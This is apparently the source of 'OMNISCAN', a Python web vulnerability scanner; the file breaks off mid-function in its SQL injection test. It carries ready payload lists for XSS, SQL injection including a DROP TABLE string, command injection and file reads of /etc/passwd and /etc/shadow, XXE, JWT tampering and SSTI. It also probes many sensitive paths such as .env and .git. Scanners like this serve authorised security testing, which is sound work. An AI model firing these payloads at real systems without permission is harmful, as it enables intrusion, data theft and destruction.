#!/usr/bin/env python3
"""
OMNISCAN - Advanced Security Testing Tool
For Web Applications and APIs - EDUCATIONAL PURPOSES ONLY

Author: Security Researcher
Version: 3.2 - Multi-threaded & Enhanced Accuracy
Usage: python omniscan.py -u https://example.com [options]
"""

import requests
import json
import sys
import argparse
import re
import time
import os
import socket
import ssl
import concurrent.futures
import threading
from urllib.parse import urljoin, urlparse, quote, parse_qs, urlencode
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama for colored output
init(autoreset=True)

class ConsoleLogger:
    """Handle console output and file logging"""
    def __init__(self, output_file=None):
        self.output_file = output_file
        self.log_buffer = []
        self.lock = threading.Lock()
        
    def log(self, message, color=Fore.WHITE, show_time=True):
        """Log message to console and buffer"""
        timestamp = datetime.now().strftime("%H:%M:%S") if show_time else ""
        prefix = f"[{timestamp}] " if timestamp else ""
        full_message = f"{color}{prefix}{message}{Style.RESET_ALL}"
        
        
        with self.lock:
            print(full_message)
            
            
            plain_message = re.sub(r'\x1b\[[0-9;]*m', '', f"{prefix}{message}")
            self.log_buffer.append(plain_message)
            
            
            if self.output_file:
                self.flush_to_file()
    
    def flush_to_file(self):
        """Write buffered logs to file"""
        if self.output_file and self.log_buffer:
            try:
                mode = 'a' if os.path.exists(self.output_file) else 'w'
                with open(self.output_file, mode, encoding='utf-8') as f:
                    for line in self.log_buffer:
                        f.write(line + '\n')
                self.log_buffer.clear()
            except Exception as e:
                print(f"{Fore.RED}[!] Error writing to log file: {e}")

class OMNISCAN:
    def __init__(self, base_url, delay=1, timeout=10, output_file=None, verbose=False, threads=10):
        self.base_url = base_url.rstrip('/')
        self.delay = delay
        self.timeout = timeout
        self.verbose = verbose
        self.threads = threads
        
        # Setup logger with output file
        self.logger = ConsoleLogger(output_file)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OMNISCAN/3.2',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        self.vulnerabilities = []
        self.discovered_endpoints = []
        self.technologies = []
        self.start_time = datetime.now()
        self.vuln_lock = threading.Lock()
        
        # Enhanced payload database with better accuracy
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '\" onmouseover=\"alert(1)',
                '\'><script>alert(1)</script>',
                'javascript:alert(1)//',
                '<body onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                '<object data=javascript:alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT NULL,NULL--",
                "' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)--",
                "1' AND SLEEP(5)--",
                "admin'--",
                "' OR 'a'='a",
                "' OR 1=1#",
                "' OR '1'='1'/*",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'nosql_injection': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "1==1"}',
                '{"username": {"$regex": ".*"}}',
                '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
                '{"username": {"$exists": true}}',
                '{"$function": "function() { return true; }"}'
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '....//....//....//etc/passwd',
                '/etc/passwd',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
            ],
            'command_injection': [
                '; ls -la',
                '| cat /etc/passwd',
                '`whoami`',
                '$(id)',
                '|| ping -c 10 127.0.0.1',
                '& dir C:\\',
                '; whoami;',
                '| whoami |',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            ],
            'idor_patterns': [
                '../',
                '..././',
                '%2e%2e%2f',
                '%252e%252e%252f',
                '..%00/',
                '..%0d/',
                '..%5c'
            ],
            'mass_assignment': [
                '{"role": "admin"}',
                '{"is_admin": true}',
                '{"privileges": "all"}',
                '{"active": true}',
                '{"email": "admin@example.com", "role": "superadmin"}',
                '{"account_type": "administrator"}',
                '{"permissions": "full_access"}'
            ],
            'jwt_tampering': [
                'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
                '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
                '{"alg":"HS256","typ":"JWT"}.{"user":"admin"}.signature',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
            ],
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '${{7*7}}',
                '{{config}}',
                '{{settings.SECRET_KEY}}',
                '{{request}}',
                '{{self}}',
                '{{4*4}}[[5*5]]',
                '{{7*\'7\'}}'
            ],
            'lfi': [
                '../../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/proc/self/environ',
                '/etc/shadow',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '../../../../windows/win.ini',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
            ]
        }
        
        # Enhanced common endpoints with better coverage
        self.common_endpoints = [
            # Root and common pages
            '/', '/index.php', '/index.html', '/home', '/main', '/default.aspx',
            
            # Administration
            '/admin', '/admin/', '/admin.php', '/admin.html', '/admin.aspx',
            '/administrator', '/administrator/', '/admin/login', '/admin/dashboard',
            '/wp-admin', '/wp-admin/', '/wp-login.php', '/user/login',
            '/manager', '/manager/', '/management', '/controlpanel',
            
            # Authentication
            '/login', '/login.php', '/login.html', '/signin', '/signin/',
            '/register', '/register.php', '/signup', '/signup/',
            '/logout', '/logout/', '/auth', '/auth/', '/authenticate',
            '/oauth', '/oauth2', '/oauth/authorize', '/oauth2/authorize',
            
            # User management
            '/user', '/user/', '/users', '/users/', '/profile', '/profile/',
            '/account', '/account/', '/settings', '/settings/', '/dashboard',
            
            # API endpoints
            '/api', '/api/', '/api/v1', '/api/v2', '/api/v3',
            '/api/users', '/api/user', '/api/auth', '/api/login',
            '/api/register', '/api/token', '/api/products', '/api/product',
            '/api/admin', '/api/config', '/api/status', '/api/health',
            '/graphql', '/graphql/', '/rest', '/rest/', '/soap', '/soap/',
            
            # Configuration files
            '/config.php', '/config.json', '/config.xml', '/config.yml',
            '/settings.php', '/settings.json', '/.env', '/.env.local',
            '/.env.production', '/.env.development', '/.env.test',
            
            # Documentation
            '/docs', '/docs/', '/api-docs', '/api-docs/', '/swagger',
            '/swagger/', '/swagger.json', '/swagger.yaml', '/openapi.json',
            '/openapi.yaml', '/api/v1/docs', '/api/v1/swagger',
            
            # Debug and information
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/status', '/status/', '/health', '/health/', '/ping',
            '/metrics', '/metrics/', '/actuator', '/actuator/health',
            
            # Common files
            '/robots.txt', '/sitemap.xml', '/sitemap.txt', '/sitemap/',
            '/crossdomain.xml', '/clientaccesspolicy.xml',
            '/humans.txt', '/security.txt', '/.well-known/security.txt',
            
            # Backup and logs
            '/backup', '/backup/', '/backups', '/backups/', '/old', '/old/',
            '/archive', '/archive/', '/temp', '/temp/', '/tmp', '/tmp/',
            '/log', '/log/', '/logs', '/logs/', '/error.log', '/access.log',
            
            # Development
            '/dev', '/dev/', '/development', '/development/', '/test', '/test/',
            '/stage', '/stage/', '/staging', '/staging/', '/demo', '/demo/',
            
            # Source control
            '/.git/', '/.git/HEAD', '/.git/config', '/.git/logs/HEAD',
            '/.svn/', '/.svn/entries', '/.hg/', '/.hg/requires',
            '/CVS/', '/CVS/Entries', '/.bzr/', '/.bzr/branch-format',
            
            # Database admin
            '/phpmyadmin', '/phpmyadmin/', '/adminer.php', '/adminer/',
            '/dbadmin', '/dbadmin/', '/mysql', '/mysql/', '/pma', '/pma/',
            
            # Server info
            '/server-status', '/server-info', '/apache-status',
            '/nginx-status', '/iisstart.htm', '/iis-85.png',
            
            # Upload directories
            '/uploads', '/uploads/', '/upload', '/upload/', '/files', '/files/',
            '/images', '/images/', '/assets', '/assets/', '/media', '/media/',
            '/static', '/static/', '/public', '/public/', '/download', '/download/',
            
            # Common scripts
            '/cgi-bin/', '/cgi-bin/test.cgi', '/cgi-bin/printenv',
            '/wp-content/', '/wp-includes/', '/wp-json/', '/xmlrpc.php',
            '/install.php', '/setup.php', '/upgrade.php', '/update.php',
            
            # Framework specific
            '/console', '/_debug', '/_profiler', '/_wdt', '/symfony/webprofiler',
            '/rails/info/properties', '/rails/info/routes', '/rails/mailers',
            
            # Misc
            '/cron.php', '/cron.sh', '/cron/', '/scheduler', '/scheduler/',
            '/queue', '/queue/', '/job', '/job/', '/task', '/task/',
            '/webhook', '/webhook/', '/callback', '/callback/'
        ]
        
        # Enhanced SQL error patterns with better regex
        self.sql_error_patterns = [
            (r'SQL syntax.*MySQL', 'MySQL'),
            (r'Warning.*mysql_.*', 'MySQL'),
            (r'MySQLSyntaxErrorException', 'MySQL'),
            (r'valid MySQL result', 'MySQL'),
            (r'PostgreSQL.*ERROR', 'PostgreSQL'),
            (r'Warning.*\Wpg_.*', 'PostgreSQL'),
            (r'valid PostgreSQL result', 'PostgreSQL'),
            (r'Driver.*SQL[\-\_\ ]*Server', 'SQL Server'),
            (r'OLE DB.* SQL Server', 'SQL Server'),
            (r'(\W|\A)SQL Server.*Driver', 'SQL Server'),
            (r'Warning.*odbc_.*', 'ODBC'),
            (r'Warning.*mssql_', 'SQL Server'),
            (r'Msg \d+, Level \d+, State \d+', 'SQL Server'),
            (r'Unclosed quotation mark after the character string', 'SQL Server'),
            (r'Microsoft OLE DB Provider for ODBC Drivers', 'ODBC'),
            (r'ORA-\d{5}', 'Oracle'),
            (r'Oracle.*Driver', 'Oracle'),
            (r'SQLite/JDBCDriver', 'SQLite'),
            (r'SQLite.Exception', 'SQLite'),
            (r'System.Data.SQLite.SQLiteException', 'SQLite'),
            (r'Warning.*sqlite_.*', 'SQLite'),
            (r'SQLite3::', 'SQLite'),
            (r'Warning.*\Wmysqli_', 'MySQLi'),
            (r'Warning.*\Wpg_query\(\)', 'PostgreSQL'),
            (r'Warning.*\Woci_', 'Oracle'),
            (r'Warning.*\Wifx_', 'Informix'),
            (r'Warning.*\Wdb2_', 'DB2'),
            (r'Warning.*\Wmaxdb_', 'MaxDB'),
            (r'You have an error in your SQL syntax', 'MySQL'),
            (r'Unknown column', 'SQL'),
            (r'Table.*doesn\'t exist', 'SQL'),
            (r'supplied argument is not a valid MySQL', 'MySQL'),
            (r'Division by zero', 'SQL'),
            (r'not a valid resource', 'SQL'),
            (r'Call to undefined function', 'SQL')
        ]
        
        # Enhanced XSS patterns with better detection
        self.xss_patterns = [
            (r'<script[^>]*>.*?</script>', 'Script tag'),
            (r'javascript:', 'JavaScript protocol'),
            (r'onerror\s*=', 'onerror handler'),
            (r'onload\s*=', 'onload handler'),
            (r'onmouseover\s*=', 'onmouseover handler'),
            (r'alert\(', 'Alert function'),
            (r'confirm\(', 'Confirm function'),
            (r'prompt\(', 'Prompt function'),
            (r'eval\(', 'Eval function'),
            (r'document\.', 'Document object'),
            (r'window\.', 'Window object'),
            (r'location\.', 'Location object'),
            (r'<iframe[^>]*>', 'Iframe tag'),
            (r'<svg[^>]*>', 'SVG tag'),
            (r'<body[^>]*>', 'Body tag'),
            (r'onclick\s*=', 'onclick handler'),
            (r'ondblclick\s*=', 'ondblclick handler'),
            (r'onmousedown\s*=', 'onmousedown handler'),
            (r'onmouseup\s*=', 'onmouseup handler'),
            (r'onmouseenter\s*=', 'onmouseenter handler'),
            (r'onmouseleave\s*=', 'onmouseleave handler'),
            (r'onkeydown\s*=', 'onkeydown handler'),
            (r'onkeyup\s*=', 'onkeyup handler'),
            (r'onkeypress\s*=', 'onkeypress handler'),
            (r'onfocus\s*=', 'onfocus handler'),
            (r'onblur\s*=', 'onblur handler'),
            (r'onsubmit\s*=', 'onsubmit handler'),
            (r'onreset\s*=', 'onreset handler'),
            (r'<embed[^>]*>', 'Embed tag'),
            (r'<object[^>]*>', 'Object tag'),
            (r'<applet[^>]*>', 'Applet tag'),
            (r'<marquee[^>]*>', 'Marquee tag')
        ]
        
        # HTTP Method details
        self.http_method_details = {
            'PUT': 'Can allow attackers to upload malicious files or overwrite existing resources',
            'DELETE': 'Can allow attackers to delete critical resources',
            'TRACE': 'Can be used for XST attacks and information disclosure',
            'CONNECT': 'Can be used to proxy traffic through the server',
            'PATCH': 'Can allow partial updates that might bypass validation',
            'OPTIONS': 'Can leak available methods and CORS information',
            'HEAD': 'Can be used to check resource existence without full response',
            'PROPFIND': 'WebDAV method that can leak directory structure'
        }
    
    def print_banner(self):
        """Display OMNISCAN banner - Stable at top"""
        banner = f"""{Fore.CYAN}{'='*80}
{Fore.YELLOW}
    ╔══════════════════════════════════════════════════════════════════════╗
    ║{Fore.RED}    ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗ █████╗ ███╗   ██╗{Fore.YELLOW}║
    ║{Fore.RED}   ██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██╔══██╗████╗  ██║{Fore.YELLOW}║
    ║{Fore.RED}   ██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ███████║██╔██╗ ██║{Fore.YELLOW}║
    ║{Fore.RED}   ██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██╔══██║██║╚██╗██║{Fore.YELLOW}║
    ║{Fore.RED}   ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████║╚██████╗██║  ██║██║ ╚████║{Fore.YELLOW}║
    ║{Fore.RED}    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Fore.YELLOW}║
    ║{Fore.CYAN}                Advanced Security Scanner v1.0                        {Fore.YELLOW}║
    ║{Fore.GREEN}                      Watching Over Your Security                     {Fore.YELLOW}║
    ╚══════════════════════════════════════════════════════════════════════╝
{Fore.CYAN}{'='*80}
{Fore.WHITE} Target URL: {Fore.YELLOW}{self.base_url}
{Fore.WHITE} Start Time: {Fore.YELLOW}{self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
{Fore.WHITE}    Delay: {Fore.YELLOW}{self.delay}s | Timeout: {Fore.YELLOW}{self.timeout}s | Threads: {Fore.YELLOW}{self.threads}
{Fore.CYAN}{'='*80}
        """
        self.logger.log(banner, color=Fore.CYAN, show_time=False)
    
    def log_vulnerability(self, vuln_type, url, details, severity="MEDIUM", extra_info=None):
        """Log discovered vulnerability with enhanced details"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Color coding based on severity
        severity_colors = {
            "CRITICAL": Fore.RED + Style.BRIGHT,
            "HIGH": Fore.RED,
            "MEDIUM": Fore.YELLOW,
            "LOW": Fore.GREEN,
            "INFO": Fore.BLUE
        }
        
        color = severity_colors.get(severity, Fore.WHITE)
        
        vuln = {
            'type': vuln_type,
            'url': url,
            'details': details,
            'severity': severity,
            'timestamp': timestamp,
            'extra_info': extra_info
        }
        
        # Thread-safe vulnerability addition
        with self.vuln_lock:
            self.vulnerabilities.append(vuln)
        
        # Log to console and file
        self.logger.log(f"[{severity}] {vuln_type}", color=color)
        self.logger.log(f"├─ URL: {url}", color=Fore.WHITE)
        self.logger.log(f"├─ Details: {details}", color=Fore.WHITE)
        
        if extra_info:
            self.logger.log(f"├─ Additional Info: {extra_info}", color=Fore.CYAN)
        
        # Add specific details based on vulnerability type
        if vuln_type == "Potentially Dangerous HTTP Method":
            method = details.split()[1]  # Extract method name
            if method in self.http_method_details:
                self.logger.log(f"├─ Risk: {self.http_method_details[method]}", color=Fore.YELLOW)
                self.logger.log(f"└─ Protection: Disable or restrict this method", color=Fore.GREEN)
        
        elif vuln_type == "SQL Injection":
            self.logger.log(f"├─ Risk: Can lead to data theft, modification, or deletion", color=Fore.YELLOW)
            self.logger.log(f"└─ Protection: Use parameterized queries/prepared statements", color=Fore.GREEN)
        
        elif vuln_type == "XSS":
            self.logger.log(f"├─ Risk: Can steal sessions, deface sites, or deliver malware", color=Fore.YELLOW)
            self.logger.log(f"└─ Protection: Implement proper output encoding/escaping", color=Fore.GREEN)
        
        elif vuln_type == "Path Traversal":
            self.logger.log(f"├─ Risk: Can access sensitive system files", color=Fore.YELLOW)
            self.logger.log(f"└─ Protection: Validate and sanitize file paths", color=Fore.GREEN)
        
        elif vuln_type == "Information Disclosure":
            self.logger.log(f"├─ Risk: Leaks sensitive information to attackers", color=Fore.YELLOW)
            self.logger.log(f"└─ Protection: Remove debug info, secure configuration files", color=Fore.GREEN)
        
        else:
            self.logger.log(f"{Fore.CYAN}{'─'*60}", color=Fore.CYAN)
    
    def safe_request(self, method, url, **kwargs):
        """Make safe HTTP request with enhanced error handling"""
        try:
            if self.verbose:
                self.logger.log(f"{method} {url}", color=Fore.BLUE)
            
            response = self.session.request(
                method, 
                url, 
                timeout=self.timeout, 
                allow_redirects=True,
                verify=False,  # Warning: Disables SSL verification
                **kwargs
            )
            
            if self.verbose:
                self.logger.log(f"Status: {response.status_code}, Size: {len(response.content)} bytes", color=Fore.BLUE)
            
            time.sleep(self.delay)
            return response
        
        except requests.exceptions.Timeout:
            if self.verbose:
                self.logger.log(f"Timeout: {url}", color=Fore.YELLOW)
            return None
        
        except requests.exceptions.ConnectionError as e:
            if self.verbose:
                self.logger.log(f"Connection Error: {url} - {str(e)}", color=Fore.YELLOW)
            return None
        
        except requests.exceptions.SSLError:
            if self.verbose:
                self.logger.log(f"SSL Error: {url}", color=Fore.YELLOW)
            return None
        
        except Exception as e:
            if self.verbose:
                self.logger.log(f"Request Error: {url} - {str(e)}", color=Fore.YELLOW)
            return None
    
    def test_endpoint(self, endpoint):
        """Test a single endpoint (for threading)"""
        url = urljoin(self.base_url, endpoint)
        
        # Try GET request
        response = self.safe_request('GET', url)
        if response:
            content_type = response.headers.get('content-type', '').lower()
            
            # Determine endpoint type
            endpoint_type = 'unknown'
            if 'text/html' in content_type:
                endpoint_type = 'web'
            elif 'application/json' in content_type:
                endpoint_type = 'api'
            elif 'application/xml' in content_type or 'text/xml' in content_type:
                endpoint_type = 'api'
            elif 'api' in endpoint.lower():
                endpoint_type = 'api'
            
            endpoint_info = {
                'url': url,
                'method': 'GET',
                'status': response.status_code,
                'type': endpoint_type,
                'size': len(response.content),
                'content_type': content_type[:50]
            }
            
            status_color = Fore.GREEN if response.status_code < 400 else Fore.YELLOW
            self.logger.log(f"{response.status_code} {url} ({endpoint_type}, {len(response.content)} bytes)", color=status_color)
            
            return endpoint_info
        
        return None
    
    def discover_endpoints(self):
        """Discover endpoints on target with multi-threading"""
        self.logger.log("Starting endpoint discovery with multi-threading...", color=Fore.CYAN)
        
        discovered = []
        
        # Use ThreadPoolExecutor for parallel endpoint discovery
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all endpoint tests
            future_to_endpoint = {executor.submit(self.test_endpoint, endpoint): endpoint 
                                 for endpoint in self.common_endpoints}
            
            # Process results as they complete
            for future in as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    result = future.result()
                    if result:
                        discovered.append(result)
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing {endpoint}: {e}", color=Fore.YELLOW)
        
        self.discovered_endpoints = discovered
        self.logger.log(f"Discovery complete: {len(discovered)} endpoints found out of {len(self.common_endpoints)} tested", color=Fore.BLUE)
        return discovered
    
    def analyze_technology(self):
        """Analyze technologies used by target with enhanced detection"""
        self.logger.log("Analyzing technologies...", color=Fore.CYAN)
        
        tech_found = []
        
        # Get main page
        response = self.safe_request('GET', self.base_url)
        if response:
            headers = response.headers
            body = response.text[:10000]  # Increased to 10000 chars for better analysis
            
            # Check headers for technology hints
            tech_indicators = {
                'Server': headers.get('server', ''),
                'X-Powered-By': headers.get('x-powered-by', ''),
                'X-AspNet-Version': headers.get('x-aspnet-version', ''),
                'X-AspNetMvc-Version': headers.get('x-aspnetmvc-version', ''),
                'X-Generator': headers.get('x-generator', ''),
                'X-Drupal-Cache': headers.get('x-drupal-cache', ''),
                'X-Varnish': headers.get('x-varnish', ''),
                'Via': headers.get('via', ''),
                'X-Frame-Options': headers.get('x-frame-options', ''),
                'X-Content-Type-Options': headers.get('x-content-type-options', ''),
                'X-XSS-Protection': headers.get('x-xss-protection', ''),
                'Content-Security-Policy': headers.get('content-security-policy', ''),
                'Strict-Transport-Security': headers.get('strict-transport-security', '')
            }
            
            for tech_name, tech_value in tech_indicators.items():
                if tech_value:
                    tech_found.append(f"{tech_name}: {tech_value}")
                    self.logger.log(f"{tech_name}: {tech_value}", color=Fore.BLUE)
            
            # Enhanced technology detection with better patterns
            tech_patterns = {
                'PHP': [
                    (r'\.php\b', 'PHP file extension'),
                    (r'PHP/\d+\.\d+', 'PHP version'),
                    (r'X-Powered-By: PHP', 'PHP header'),
                    (r'PHPSESSID', 'PHP session ID'),
                    (r'session\.save_path', 'PHP session config'),
                    (r'display_errors', 'PHP error display'),
                    (r'error_reporting', 'PHP error reporting')
                ],
                'ASP.NET': [
                    (r'\.aspx\b', 'ASPX file extension'),
                    (r'ASP\.NET', 'ASP.NET framework'),
                    (r'X-AspNet-Version', 'ASP.NET version'),
                    (r'__VIEWSTATE', 'ViewState'),
                    (r'__EVENTVALIDATION', 'Event Validation'),
                    (r'\.ashx\b', 'ASHX handler'),
                    (r'\.asmx\b', 'ASMX web service')
                ],
                'Node.js': [
                    (r'X-Powered-By: Express', 'Express.js'),
                    (r'Node\.js', 'Node.js'),
                    (r'connect\.sid', 'Connect session'),
                    (r'session=', 'Node.js session'),
                    (r'Express', 'Express framework')
                ],
                'Python/Django': [
                    (r'csrftoken', 'Django CSRF token'),
                    (r'sessionid', 'Django session ID'),
                    (r'Django', 'Django framework'),
                    (r'WSGIServer', 'WSGI server'),
                    (r'Python/\d+', 'Python version')
                ],
                'Python/Flask': [
                    (r'flask', 'Flask framework'),
                    (r'werkzeug', 'Werkzeug'),
                    (r'session=', 'Flask session')
                ],
                'Java/JSP': [
                    (r'\.jsp\b', 'JSP file'),
                    (r'JSESSIONID', 'Java session ID'),
                    (r'Apache-Tomcat', 'Tomcat server'),
                    (r'JBoss', 'JBoss server'),
                    (r'GlassFish', 'GlassFish server'),
                    (r'WebLogic', 'WebLogic server'),
                    (r'\.do\b', 'Struts action')
                ],
                'Ruby/Rails': [
                    (r'_rails_app_session', 'Rails session'),
                    (r'rails', 'Ruby on Rails'),
                    (r'rack\.session', 'Rack session'),
                    (r'\.rb\b', 'Ruby file')
                ],
                'WordPress': [
                    (r'wp-content', 'WordPress content'),
                    (r'wp-includes', 'WordPress includes'),
                    (r'WordPress', 'WordPress CMS'),
                    (r'wp-json', 'WordPress REST API'),
                    (r'/wp-admin/', 'WordPress admin'),
                    (r'wp-', 'WordPress prefix')
                ],
                'Joomla': [
                    (r'joomla', 'Joomla CMS'),
                    (r'Joomla!', 'Joomla'),
                    (r'com_', 'Joomla component'),
                    (r'index.php?option=', 'Joomla option')
                ],
                'Drupal': [
                    (r'drupal', 'Drupal CMS'),
                    (r'Drupal', 'Drupal'),
                    (r'sites/all/', 'Drupal sites'),
                    (r'/sites/default/', 'Drupal default site')
                ]
            }
            
            # Check response body for technology patterns
            for tech, patterns in tech_patterns.items():
                tech_detected = False
                for pattern, description in patterns:
                    if re.search(pattern, body + str(headers), re.IGNORECASE):
                        if not tech_detected and tech not in [t.split(':')[0] for t in tech_found if ':' in t]:
                            tech_found.append(tech)
                            self.logger.log(f"Technology detected: {tech} ({description})", color=Fore.BLUE)
                            tech_detected = True
                            break
        
        self.technologies = tech_found
        return tech_found
    
    def test_xss_single(self, test_data):
        """Test a single XSS payload (for threading)"""
        param, payload, test_url = test_data
        
        response = self.safe_request('GET', test_url)
        if not response:
            return None
        
        response_text = response.text
        
        # Enhanced XSS detection
        issues = []
        
        # 1. Check if payload is reflected without proper encoding
        if payload in response_text:
            # Check if it's properly encoded in context
            encoded_check = response_text.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#39;', "'").replace('&amp;', '&')
            if payload in encoded_check:
                issues.append(("Reflected XSS", f"Payload reflected without proper encoding: {payload[:50]}..."))
        
        # 2. Check for XSS patterns in response
        for pattern, pattern_type in self.xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                matches = list(re.finditer(pattern, response_text, re.IGNORECASE))
                if matches:
                    issues.append(("Potential XSS Pattern", f"{pattern_type} found in response"))
                    break
        
        # 3. Check for script contexts
        script_contexts = [
            (r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', 'Inside script tag'),
            (r'on\w+\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']', 'Inside event handler'),
            (r'href\s*=\s*["\']javascript:.*?' + re.escape(payload) + r'.*?["\']', 'In JavaScript URL')
        ]
        
        for context_pattern, context_type in script_contexts:
            if re.search(context_pattern, response_text, re.IGNORECASE):
                issues.append(("XSS in Script Context", f"Payload found in {context_type}"))
                break
        
        return issues
    
    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities with multi-threading"""
        self.logger.log("Testing for XSS vulnerabilities with multi-threading...", color=Fore.CYAN)
        
        # Prepare test data
        test_params = ['q', 'search', 'query', 'name', 'email', 'message', 'comment', 
                      'title', 'description', 'input', 'param', 'value', 'id', 'user',
                      'keyword', 'term', 'filter', 'sort', 'order', 'limit']
        
        test_data = []
        for param in test_params:
            for payload in self.payloads['xss'][:8]:  # Test more payloads
                test_url = f"{self.base_url}/?{param}={quote(payload)}"
                test_data.append((param, payload, test_url))
        
        # Use ThreadPoolExecutor for parallel XSS testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all XSS tests
            future_to_test = {executor.submit(self.test_xss_single, data): data 
                             for data in test_data}
            
            # Process results as they complete
            for future in as_completed(future_to_test):
                param, payload, test_url = future_to_test[future]
                try:
                    issues = future.result()
                    if issues:
                        for issue_type, issue_details in issues:
                            self.log_vulnerability(
                                issue_type,
                                test_url,
                                issue_details,
                                "HIGH",
                                f"Parameter: {param}, Payload: {payload[:30]}..."
                            )
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing XSS at {test_url}: {e}", color=Fore.YELLOW)
    
    def test_sqli_single(self, test_data):
        """Test a single SQL injection payload (for threading)"""
        param, payload, test_url = test_data
        
        response = self.safe_request('GET', test_url)
        if not response:
            return None
        
        response_text = response.text
        
        # Enhanced SQL injection detection
        issues = []
        
        # 1. Check for SQL error messages
        for pattern, db_type in self.sql_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                issues.append(("SQL Injection", f"{db_type} error detected"))
                break
        
        # 2. Check for boolean-based SQLi indicators
        boolean_indicators = [
            ('MySQL', r'You have an error in your SQL syntax'),
            ('PostgreSQL', r'ERROR:\s+syntax error'),
            ('SQL Server', r'Unclosed quotation mark'),
            ('Oracle', r'ORA-\d{5}'),
            ('Generic', r'SQL syntax')
        ]
        
        for db_type, indicator in boolean_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                issues.append(("SQL Injection", f"Boolean-based indicator for {db_type}"))
                break
        
        # 3. Check for generic SQL errors
        generic_errors = [
            r'supplied argument is not a valid',
            r'Division by zero',
            r'not a valid resource',
            r'Call to undefined function'
        ]
        
        for error in generic_errors:
            if re.search(error, response_text, re.IGNORECASE):
                issues.append(("SQL Injection", "Generic SQL error detected"))
                break
        
        # 4. Check for time-based indicators (if payload contains SLEEP/WAITFOR)
        if any(keyword in payload.upper() for keyword in ['SLEEP', 'WAITFOR', 'BENCHMARK']):
            # Note: This would need response time measurement for real detection
            pass
        
        return issues
    
    def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities with multi-threading"""
        self.logger.log("Testing for SQL Injection vulnerabilities with multi-threading...", color=Fore.CYAN)
        
        # Prepare test data
        test_params = ['id', 'user', 'product', 'category', 'page', 'article', 
                      'news', 'item', 'post', 'comment_id', 'order', 'sort',
                      'limit', 'offset', 'search', 'query', 'filter']
        
        test_data = []
        for param in test_params:
            for payload in self.payloads['sqli'][:10]:  # Test more payloads
                test_url = f"{self.base_url}/?{param}={quote(payload)}"
                test_data.append((param, payload, test_url))
        
        # Use ThreadPoolExecutor for parallel SQLi testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all SQLi tests
            future_to_test = {executor.submit(self.test_sqli_single, data): data 
                             for data in test_data}
            
            # Process results as they complete
            for future in as_completed(future_to_test):
                param, payload, test_url = future_to_test[future]
                try:
                    issues = future.result()
                    if issues:
